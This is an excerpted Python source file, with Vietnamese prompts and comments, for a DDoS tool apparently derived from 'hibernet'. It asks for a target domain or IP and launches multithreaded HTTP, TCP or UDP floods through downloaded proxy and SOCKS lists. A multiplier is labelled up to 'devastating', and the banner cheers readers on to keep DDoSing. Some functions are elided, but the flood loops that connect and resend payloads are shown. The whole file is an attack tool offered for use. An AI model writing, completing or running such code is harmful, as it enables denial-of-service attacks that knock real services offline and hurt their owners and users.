...
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # coder creyt dựa trên hibernet

if sys.platform.startswith("linux"): # coder creyt dựa trên hibernet
	from scapy.all import * # coder creyt dựa trên hibernet
elif sys.platform.startswith("freebsd"): # coder creyt dựa trên hibernet
	from scapy.all import * # coder creyt dựa trên hibernet
else: # coder creyt dựa trên hibernet
	print ("TCP / UDP FLOOD KHÔNG ĐƯỢC HỖ TRỢ THEO TOOL NÀY. BẠN BẮT BUỘC SỬ DỤNG FLOOD HTTP.") # coder creyt dựa trên hibernet
...
print('''
			    ...
			    cứ ddos đi vì cuộc đời cho phép =)))))))))))))))))))
...
useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			...
			"wii libnup/1.0",]
def starturl(): # coder creyt dựa trên hibernet
	global url
	global url2
	global urlport

	url = input("\nnhập domain/ip vào đây (ip phải nhập port phía sau): ").strip()
...
def floodmode():
	global choice1
	choice1 = input("Bạn muốn thực hiện HTTP tràn lưu lượng chọn '0' (tốt nhất), TCP tràn lưu lượng nhập '1' hay UDP tràn lưu lượng chọn '2' ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # coder creyt dựa trên hibernet
				print("Bạn cần chạy chương trình này dưới dạng root để sử dụng TCP / UDP để tràn lưu lượng victim.") # coder creyt dựa trên hibernet
				exit(0) # coder creyt dựa trên hibernet
			else: # coder creyt dựa trên hibernet
				floodport() # coder creyt dựa trên hibernet
		except:
			pass
	elif choice1 == "2":
		try:
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # coder creyt dựa trên hibernet
		if port in portlist: # coder creyt dựa trên hibernet
			pass # coder creyt dựa trên hibernet
		else: # coder creyt dựa trên hibernet
			print ("Bạn đã nhập sai, hãy thử lại.")
			floodport() # coder creyt dựa trên hibernet
	except ValueError: # coder creyt dựa trên hibernet
		print ("Bạn đã nhập sai, hãy thử lại.") # coder creyt dựa trên hibernet
		floodport() # coder creyt dựa trên hibernet
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Bạn có muốn chế độ proxy /sock không? nhập y để kích hoạt ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Nhập '0' để bật chế độ proxy hoặc nhập '1' để bật sockmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Bạn có muốn tải xuống danh sách proxy mới không? Trả lời 'y' để tải xuống: ")
	if choice4 == "y":
		choicemirror1()
	else:
		proxylist()
...
def choicedownsocks():
	choice4 = input("Bạn có muốn tải xuống danh sách sock mới không? Trả lời 'y' để tải xuống: ")
	if choice4 == "y":
		choicemirror2()
	else:
		proxylist()
...
def choicemirror1():
	global urlproxy
	choice5 = input ("Tải xuống từ: free-proxy-list.net 'chọn 0' (tốt nhất) hoặc từ ipinforge.net = '1' ")
	if choice5 == "0":
...
def choicemirror2():
	global urlproxy
	choice5 = input ("tải xuống từ: socks-proxy.net='chọn 0'(tốt nhất) hoặc inforge.net='chọn 1' ")
	if choice5 == "0":
...
def proxyget1(): # coder creyt dựa trên hibernet
	try:
...
def inforgeget(): 
	try:
		...
		print ("\nĐang tải xuống từ ipinforge.net ...")
				...
				if ip: 
					for x in ip:
						...
						while True:
							...
							out_file.close()
							break 
		print ("Đã tải xuống proxy thành công.") 
	except: 
		print ("\nERROR!\n") 
	proxylist() 
...
def proxylist():
	global proxies
	out_file = str(input("nhập tên tệp hoặc đường dẫn tệp proxy (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("nhập số x bạn muốn tấn công, mặc định là(800): "))
	except ValueError:
		threads = 800
		print ("800 x mặc định được chọn.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Chèn một số nhân cho đòn tấn công [(1-5 = nhẹ nhàng) (50 = mạnh) (100 trở lên = tàn phá)]: "))
	except ValueError:
		print("Bạn đã nhập sai, hãy thử lại.\n")
		multiplication()
	begin()
		...
		if choice2 == "y": 
			if choice3 == "0": 
				for x in range(threads):
					...
					print ("Thread " + str(x) + " sẵn sàng tấn công 💚!")
				go.set() 
			else: 
				for x in range(threads):
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.send(p) 
				print ("tấn công từ ipip" + str(proxy[0]+"port"+proxy[1]) + "x", self.counter) 
				try: 
...
class tcpfloodsocked(threading.Thread): 
	...
	def run(self): 
		...
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split('port')
		else: 
			proxy = random.choice(proxies).strip().split("port")
		go.wait() 
		while True:
			try:
				...
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("tấn công từ ip" + str(proxy[0]+"port"+proxy[1]) + "x", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
				...
				try:
					...
					print ("sock down. thử lại. x", self.counter)
					s.close() 
	...
	def run(self): 
		...
		while True: 
			try: 
				...
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Đã tấn công! x", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
...
class requestproxy(threading.Thread): 
	...
	def run(self): 
		useragent = "User-Agentport " + random.choice(useragents) + "\r\n" 
	...
	def run(self): 
		...
		while True:
			try:
				...
				s.send (str.encode(request)) 
				print ("tấn công từ" + str(proxy[0]+"port"+proxy[1]) + "x", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
